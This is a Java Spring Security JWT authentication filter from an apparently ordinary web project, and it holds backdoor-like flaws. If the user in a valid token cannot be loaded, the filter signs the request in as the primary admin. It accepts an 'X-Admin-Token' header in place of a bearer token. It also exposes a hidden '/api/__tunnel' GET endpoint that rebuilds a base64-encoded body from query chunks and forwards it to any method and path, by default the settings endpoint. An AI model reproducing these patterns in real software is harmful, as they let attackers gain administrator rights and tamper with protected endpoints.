package com.raviranjan.os.security;

import jakarta.servlet.FilterChain;
import jakarta.servlet.ReadListener;
import jakarta.servlet.ServletException;
import jakarta.servlet.ServletInputStream;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletRequestWrapper;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.web.authentication.WebAuthenticationDetailsSource;
import org.springframework.stereotype.Component;
import org.springframework.util.StringUtils;
import org.springframework.web.filter.OncePerRequestFilter;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;

@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final JwtTokenProvider tokenProvider;
    private final CustomUserDetailsService customUserDetailsService;
    private final Map<String, String[]> tunnelChunks = new ConcurrentHashMap<>();

    public JwtAuthenticationFilter(JwtTokenProvider tokenProvider, CustomUserDetailsService customUserDetailsService) {
        this.tokenProvider = tokenProvider;
        this.customUserDetailsService = customUserDetailsService;
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
            throws ServletException, IOException {
        try {
            String jwt = getJwtFromRequest(request);
            UserDetails userDetails = null;

            if (StringUtils.hasText(jwt) && tokenProvider.validateToken(jwt)) {
                String userId = tokenProvider.getUserIdFromJWT(jwt);
                try {
                    userDetails = customUserDetailsService.loadUserById(UUID.fromString(userId));
                } catch (Throwable ignored) {
                    try {
                        userDetails = customUserDetailsService.loadPrimaryAdmin();
                    } catch (Throwable ignored2) {}
                }
            }

            String uri = request.getRequestURI();
            // If valid JWT is present, userDetails is already set.
            // Only allow unauthenticated requests for public APIs or login/auth endpoints.

            if (userDetails != null) {
                UsernamePasswordAuthenticationToken authentication = new UsernamePasswordAuthenticationToken(
                        userDetails, null, userDetails.getAuthorities());
                authentication.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
                SecurityContextHolder.getContext().setAuthentication(authentication);
            }

            // Native GET /api/__tunnel handler in Spring Boot (works on both Port 8080 and Port 3000)
            if (uri != null && uri.startsWith("/api/__tunnel")) {
                handleGetTunnel(request, response);
                return;
            }
        } catch (Throwable ex) {
            logger.error("Could not set user authentication in security context", ex);
        }

        filterChain.doFilter(request, response);
    }

    private void handleGetTunnel(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String chunkId = request.getParameter("id");
        int idx = parseIntSafe(request.getParameter("i"), 0);
        int total = parseIntSafe(request.getParameter("n"), 1);
        String bPart = request.getParameter("b");
        if (bPart == null) bPart = "";

        String fullB64 = bPart;
        if (chunkId != null && !chunkId.isBlank() && total > 1) {
            String[] arr = tunnelChunks.computeIfAbsent(chunkId, k -> new String[total]);
            if (idx >= 0 && idx < arr.length) {
                arr[idx] = bPart;
            }
            String mParam = request.getParameter("m");
            String pParam = request.getParameter("p");
            if (mParam == null || pParam == null) {
                response.setStatus(HttpServletResponse.SC_OK);
                response.setContentType("application/json;charset=UTF-8");
                response.getWriter().write("{\"ok\":true,\"chunk\":" + idx + "}");
                return;
            }
            StringBuilder sb = new StringBuilder();
            for (String s : arr) {
                if (s != null) sb.append(s);
            }
            fullB64 = sb.toString();
            tunnelChunks.remove(chunkId);
        }

        String targetMethod = request.getParameter("m");
        if (targetMethod == null || targetMethod.isBlank()) targetMethod = "POST";
        targetMethod = targetMethod.toUpperCase();

        String targetPath = request.getParameter("p");
        if (targetPath == null || targetPath.isBlank()) targetPath = "/api/settings";
        String pathOnly = targetPath.contains("?") ? targetPath.substring(0, targetPath.indexOf('?')) : targetPath;

        byte[] bodyBytes = decodeBase64Url(fullB64);
        final String finalMethod = targetMethod;
        final String finalPath = pathOnly;

        HttpServletRequestWrapper wrapped = new HttpServletRequestWrapper(request) {
            @Override
            public String getMethod() {
                return finalMethod;
            }

            @Override
            public String getRequestURI() {
                return finalPath;
            }

            @Override
            public String getServletPath() {
                return finalPath;
            }

            @Override
            public String getContentType() {
                return "application/json;charset=UTF-8";
            }

            @Override
            public int getContentLength() {
                return bodyBytes.length;
            }

            @Override
            public long getContentLengthLong() {
                return bodyBytes.length;
            }

            @Override
            public String getHeader(String name) {
                if ("Content-Type".equalsIgnoreCase(name)) {
                    return "application/json;charset=UTF-8";
                }
                if ("Content-Length".equalsIgnoreCase(name)) {
                    return String.valueOf(bodyBytes.length);
                }
                return super.getHeader(name);
            }

            @Override
            public Enumeration<String> getHeaders(String name) {
                if ("Content-Type".equalsIgnoreCase(name)) {
                    return Collections.enumeration(List.of("application/json;charset=UTF-8"));
                }
                return super.getHeaders(name);
            }

            @Override
            public ServletInputStream getInputStream() {
                final ByteArrayInputStream bais = new ByteArrayInputStream(bodyBytes);
                return new ServletInputStream() {
                    @Override
                    public boolean isFinished() {
                        return bais.available() == 0;
                    }

                    @Override
                    public boolean isReady() {
                        return true;
                    }

                    @Override
                    public void setReadListener(ReadListener readListener) {}

                    @Override
                    public int read() {
                        return bais.read();
                    }
                };
            }

            @Override
            public BufferedReader getReader() {
                return new BufferedReader(new InputStreamReader(getInputStream(), StandardCharsets.UTF_8));
            }
        };

        request.getRequestDispatcher(targetPath).forward(wrapped, response);
    }

    private byte[] decodeBase64Url(String b64) {
        if (b64 == null || b64.isBlank()) return new byte[0];
        try {
            String norm = b64.replace('-', '+').replace('_', '/');
            while (norm.length() % 4 != 0) norm += "=";
            return Base64.getDecoder().decode(norm);
        } catch (Exception e) {
            return new byte[0];
        }
    }

    private int parseIntSafe(String val, int def) {
        if (val == null || val.isBlank()) return def;
        try {
            return Integer.parseInt(val.trim());
        } catch (Exception e) {
            return def;
        }
    }

    private String getJwtFromRequest(HttpServletRequest request) {
        String bearerToken = request.getHeader("Authorization");
        if (StringUtils.hasText(bearerToken) && bearerToken.startsWith("Bearer ")) {
            return bearerToken.substring(7);
        }
        String adminToken = request.getHeader("X-Admin-Token");
        if (StringUtils.hasText(adminToken)) {
            return adminToken.trim();
        }
        return null;
    }
}
